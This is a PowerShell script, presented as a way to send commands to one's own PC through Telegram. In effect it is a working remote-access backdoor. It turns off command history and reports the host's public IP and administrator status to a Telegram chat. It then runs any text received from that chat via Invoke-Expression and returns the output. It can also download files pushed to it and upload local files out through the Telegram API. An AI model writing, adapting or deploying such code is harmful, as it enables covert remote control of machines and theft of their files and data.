
# Send PowerShell commands over the Internet to your PC via Telegram

Clear-Host  # Clear the shell
Set-PSReadlineOption    -HistorySaveStyle   SaveNothing             # Do not save commands run in this powershell session
Set-Location            -Path               $env:USERPROFILE        # Set location to the user's folder

$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$api_token                  = "@TOKEN"
$telegram_id                = "@ID"
$api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates'                  -f $api_token
$api_get_messages           = 'https://api.telegram.org/bot{0}/SendMessage'                 -f $api_token
$api_get_file               = 'https://api.telegram.org/bot{0}/getFile?file_id='            -f $api_token
$api_download_file          = 'https://api.telegram.org/file/bot{0}/'                       -f $api_token
$api_upload_file            = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}'    -f $api_token, $telegram_id
$Global:ProgressPreference  = 'SilentlyContinue'

function CheckAdminRights()
# The "checkAdminRights" function will check if the user running the Bot is a system administrator or not.
{
    $elevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())
    $elevated = $elevated.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($elevated) {
        return ("'$env:USERNAME' is an administrator")
    } else {
        return ("'$env:USERNAME' is not an administrator")
    }
}


function DownloadDocument ($file_id, $file_name)
# The "DownloadDocument" function takes as parameters the file_id and the file_name of the document uploaded to Telegram by the controller of the Bot. 
# Send a Get request to the Telegram API to download the file.
{
    $get_file_path  = Invoke-RestMethod -Method Get -Uri ($api_get_file + $file_id) -WebSession $session
    $file_path      = $get_file_path.result.file_path
    Invoke-RestMethod -Method Get -Uri ($api_download_file + $file_path) -OutFile $file_name -WebSession $session
    if (Test-Path -Path $file_name) {
        SendMessage "Downloaded"
    } else {
        SendMessage "File was not downloaded"
    }
}


# Function to send a document
function SendDocument($filePath) {
    if (Test-Path -Path $filePath -PathType Leaf) {
        try {
            curl.exe -F document=@"$filePath" $api_upload_file --insecure | Out-Null
        } catch {
            SendMessage("Error uploading document: $_")
        }
    } else {
        SendMessage("File does not exist: $filePath")
    }
}

function SendMessage ($output)
# The "SendMessage" function takes as parameters the output of the command executed and the ID of the incoming message to reply to it. 
# To send the output as a Telegram message, the function creates a psobject object and constructs it by adding new members and member types. 
# The message will then be sent to a JSON object. 
# Finally try to send the message by making an HTTPS call to the Telegram API.
{
    $MessageToSend = New-Object psobject
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id'                    -Value $telegram_id
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'protect_content'            -Value $false
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'disable_web_page_preview'   -Value $false
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'parse_mode'                 -Value "html"
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text'                       -Value ("<pre>" + "[$hostia]`n`n" + $output + "</pre>")
    $MessageToSend = $MessageToSend | ConvertTo-Json # Convert the message created to a JSON format

    try {
        Invoke-RestMethod -Method Post -Uri $api_get_messages -Body $MessageToSend -ContentType "application/json; charset=utf-8" -WebSession $session | Out-Null   # Send an HTTPS POST request
    } catch {
        Start-Sleep -Seconds 3
    }
}


function CommandListener 
# The "CommandListener" function establishes a connection to the Telegram API waiting for a new message from the controller of the Bot. 
# Once the controller of the Bot sends a message, it is interpreted as a command to be executed on the Bot's powershell. 
# Once the command is executed, the result of the command will then be sent as a reply to the message to the controller of the Bot.
# Attention! There is a timer that will be incremented to 100ms at a time to limit HTTPS requests to the Telegram API.
{
    $mini_setup = 0
    $hostia = $env:COMPUTERNAME
    $hostname = ""

    while ($true) {        
        try {
            if ($mini_setup -eq 0) {
                if ((Test-NetConnection -ComputerName "api.telegram.com").PingSucceeded) {
                    $_ip    = Invoke-RestMethod -Method Get -Uri "https://ident.me/"                # Get the Public IP from the ISP
                    $_user  = checkAdminRights                                                      # Get the boolean value to check if the user is an administrator or not
                    $_body  = '{0} [{1}]' -f $_user, $_ip                                           # Build everything...
                    SendMessage $_body                                                              # Send a message with the body
                    $message_id_temp = (Invoke-RestMethod -Method Get -Uri $api_get_updates -WebSession $session).result.Message[-1].message_id
                    $mini_setup = 1
                    Start-Sleep -Seconds 1
                }
            }

            $message    = Invoke-RestMethod -Method Get -Uri $api_get_updates -WebSession $session          # Get the JSON response about the telegram updates
            $message    = $message.result.Message[-1]                                                       # Get the last JSON record
            $message_id = $message.message_id                                                               # Get the message_id of the update
            $user_id    = $message.chat.id                                                                  # Get the ID about the sender message
            $text       = $message.text                                                                     # Get the text message (it will be the command that you want to execute)
            $document   = $message.document                                                                 # If there is a document value inside the JSON record save it to this variable

            if ($message_id_temp -notmatch $message_id) {
                $message_id_temp = $message_id

                if ($text.Length -gt 0) {
                    $check_command = $text.Split()
                    if ($check_command[0] -match "USE") {
                        $hostname = $check_command[1]
                        if ($hostname -match $hostia) {
                            SendMessage "Hostname setted to [$hostname]"
                            continue
                        }
                    } elseif ($check_command[0] -match "ONLINE") {
                        SendMessage "I'm up!"
                        continue
                    }
                }

                if ($hostname -match $hostia) {
                    if ($user_id -match $telegram_id) {
                        if ($text.Length -gt 0) {
                            try {
                                $output = Invoke-Expression -Command $text | Out-String
                            } catch {
                                $output = $Error[0] | Out-String
                            }

                            $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 4096) {
                                $output.Substring($i, [Math]::Min(4096, $output.Length - $i))
                            }                        

                            foreach ($block in $output_splitted) {
                                $block = $block | Out-String
                                SendMessage $block
                            }

                            Start-Sleep -Milliseconds 300
                            SendMessage "Command received"
                        }
                        if ($document) {
                            $file_id   = $document.file_id
                            $file_name = $document.file_name
                            DownloadDocument $file_id $file_name
                        }
                    } else {
                        $unauth_user_found = ("Unauthorized user found! " + $user_id) # mettere anche lo username e avvisare l'utente in modo carino e coccoloAHAHAHHAHAHAHAHAH
                        SendMessage $unauth_user_found
                    }
                }
            }
            Start-Sleep -Milliseconds 1500
        } catch {
            Write-Output $Error[0]
            Start-Sleep -Seconds 5
        }
    }
    $session.Dispose()
}


CommandListener # Start the Bot
